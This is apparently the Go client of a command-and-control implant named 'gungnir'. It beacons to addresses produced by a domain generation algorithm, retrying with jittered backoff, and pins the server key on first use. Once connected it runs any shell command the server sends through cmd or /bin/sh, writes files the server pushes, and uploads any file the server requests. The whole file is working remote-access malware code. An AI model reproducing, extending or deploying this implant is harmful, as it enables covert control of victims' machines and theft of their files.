package main

import (
    "encoding/hex"
    "encoding/json"
    "errors"
    "flag"
    "fmt"
    "io"
    "log"
    "math/rand"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "sync"
    "time"
    
    p "gungnir/internal/proto"
    u "gungnir/internal/utils"
    s "gungnir/internal/secure"
)

const blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out."

type Client struct {
    id   string
    conn net.Conn
    send chan *p.Message
    wg   sync.WaitGroup
}

func main() {
    id := flag.String("id", "", "client id, default hostname")
    flag.Parse()

    if *id == "" {
        *id = hostnameFallback()
    }

    rand.Seed(time.Now().UnixNano())

    for {
        conn, picked := dialWithBackoff(9002)
        log.Printf("connected to %s", picked)

        if err := runSession(*id, conn); err != nil {
            log.Printf("session ended with error: %v", err)
        } else {
            log.Printf("session ended")
        }

        _ = conn.Close()
        sleepWithJitter(2*time.Second, 500*time.Millisecond)
    }
}

func dialWithBackoff(port int) (net.Conn, string) {
    attempt := 0
    backoff := 1 * time.Second
    maxBackoff := 30 * time.Second

    for {
        for addr := range u.GenDomainsStream(23, 16, port) {
            attempt++
            conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
            if err == nil {
                return conn, addr
            }

            log.Printf("dial attempt #%d to %s failed: %v", attempt, addr, err)
            sleepWithJitter(backoff, backoff*2)
        }

        backoff *= 2
        if backoff > maxBackoff {
            backoff = maxBackoff
        }
    }
}

func sleepWithJitter(base time.Duration, jitter time.Duration) {
    if jitter <= 0 {
        time.Sleep(base)
        return
    }

    extra := time.Duration(rand.Int63n(int64(jitter)))
    time.Sleep(base + extra)
}

func runSession(id string, conn net.Conn) error {
    // TOFU handshake
    sess, err := s.ClientTOFU(conn, loadPinned, savePinned)
    if err != nil {
        return fmt.Errorf("TOFU handshake fail: %w", err)
    }

    c := &Client{
        id:   id,
        conn: conn,
        send: make(chan *p.Message, 32),
    }

    // crypto writer
    c.wg.Add(1)
    go func() {
        defer c.wg.Done()
        for msg := range c.send {
            b, err := json.Marshal(msg)
            if err != nil {
                log.Printf("json marshal error: %v", err)
                return
            }

            if err := sess.WriteMsg(b); err != nil {
                log.Printf("write error: %v", err)
                return
            }
        }
    }()

    // register
    c.send <- &p.Message{Type: "register", ClientID: c.id}
    log.Printf("registered as %s", c.id)

    // reader loop
    for {
        b, err := sess.ReadMsg()
        if err != nil {
            if errors.Is(err, io.EOF) {
                log.Printf("server closed")
                break
            }

            return fmt.Errorf("read error: %w", err)
        }

        var msg p.Message
        if err := json.Unmarshal(b, &msg); err != nil {
            return fmt.Errorf("json decode: %w", err)
        }

        switch msg.Type {
        case "secure_reset":
            if len(msg.Data) != 32 {
                log.Printf("bad secure_reset payload")
                continue
            }

            var newPub [32]byte
            copy(newPub[:], msg.Data)
            if err := sess.RekeyClientTOFU(newPub, savePinned); err != nil {
                log.Printf("rekey failed: %v", err)
                continue
            }

            ack := &p.Message{ID: msg.ID, Type: "secure_reset_ack"}
            b, _ := json.Marshal(ack)
            if err := sess.WriteMsg(b); err != nil {
                log.Printf("ack write failed: %v", err)
            }
        case "file":
            go c.handleFile(&msg)
        case "pull_file":
            go c.handlePullFile(&msg)
        case "cmd":
            go c.handleCmd(&msg)
        default:
            log.Printf("unknown msg type: %s", msg.Type)
        }
    }

    close(c.send)
    c.wg.Wait()
    return nil
}

func (c *Client) handleFile(msg *p.Message) {
    err := saveFile(msg.FilePath, msg.Data)
    if err == nil && msg.Checksum != "" {
        sum, sumErr := p.SHA256FileHex(msg.FilePath)
        if sumErr != nil {
            err = fmt.Errorf("saved but checksum read failed: %v", sumErr)
        } else if !strings.EqualFold(sum, msg.Checksum) {
            err = fmt.Errorf("checksum mismatch expected=%s got=%s", msg.Checksum, sum)
        }
    }

    reply := &p.Message{
        ID:    msg.ID,
        Type:  "file_ack",
        Error: errString(err),
    }

    c.send <- reply
}

func (c *Client) handlePullFile(msg *p.Message) {
    path := strings.TrimSpace(msg.FilePath)
    if path == "" {
        c.send <- &p.Message{ID: msg.ID, Type: "file", Error: "empty src path"}
        return
    }

    data, err := os.ReadFile(path)
    sum := ""
    if err == nil {
        sum = p.SHA256Hex(data)
    }

    c.send <- &p.Message{
        ID:       msg.ID,
        Type:     "file",
        FilePath: msg.FilePath,
        Data:     data,
        Checksum: sum,
        Error:    errString(err),
    }
}

func (c *Client) handleCmd(msg *p.Message) {
    out, code, err := runShell(msg.Command)

    reply := &p.Message{
        ID:       msg.ID,
        Type:     "cmd_result",
        Output:   out,
        ExitCode: code,
        Error:    errString(err),
    }

    c.send <- reply
}

func saveFile(path string, data []byte) error {
    if path == "" {
        return fmt.Errorf("empty path")
    }

    dir := filepath.Dir(path)
    if dir != "." {
        if err := os.MkdirAll(dir, 0o755); err != nil {
            return err
        }
    }

    return os.WriteFile(path, data, 0o644)
}

func runShell(cmdline string) (string, int, error) {
    if strings.TrimSpace(cmdline) == "" {
        return "", 0, nil
    }

    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", cmdline)
    } else {
        cmd = exec.Command("/bin/sh", "-c", cmdline)
    }

    out, err := cmd.CombinedOutput()
    code := 0
    if err != nil {
        var ee *exec.ExitError
        if errors.As(err, &ee) {
            code = ee.ExitCode()
        } else {
            code = -1
        }
    }

    return string(out), code, err
}

func errString(err error) string {
    if err == nil {
        return ""
    }

    return err.Error()
}

func hostnameFallback() string {
    h, err := os.Hostname()
    if err != nil || h == "" {
        return "client-" + p.NewID()
    }

    return h
}

// ========== Pin TOFU em arquivo ==========

func pinFilePath() string {
    if v := strings.TrimSpace(os.Getenv("GUNGNIR_PIN_FILE")); v != "" {
        return v
    }

    home, _ := os.UserHomeDir()
    if home == "" {
        home = "."
    }

    _ = os.MkdirAll(filepath.Join(home, ".gungnir"), 0o700)
    return filepath.Join(home, ".gungnir", "server_pub.hex")
}

func loadPinned() ([32]byte, bool) {
    var out [32]byte
    p := pinFilePath()
    b, err := os.ReadFile(p)
    if err != nil {
        return out, false
    }

    raw, err := hex.DecodeString(strings.TrimSpace(string(b)))
    if err != nil || len(raw) != 32 {
        return out, false
    }

    copy(out[:], raw)
    return out, true
}

func savePinned(pub [32]byte) error {
    p := pinFilePath()
    tmp := p + ".tmp"
    if err := os.WriteFile(tmp, []byte(hex.EncodeToString(pub[:])+"\n"), 0o600); err != nil {
        return err
    }

    return os.Rename(tmp, p)
}

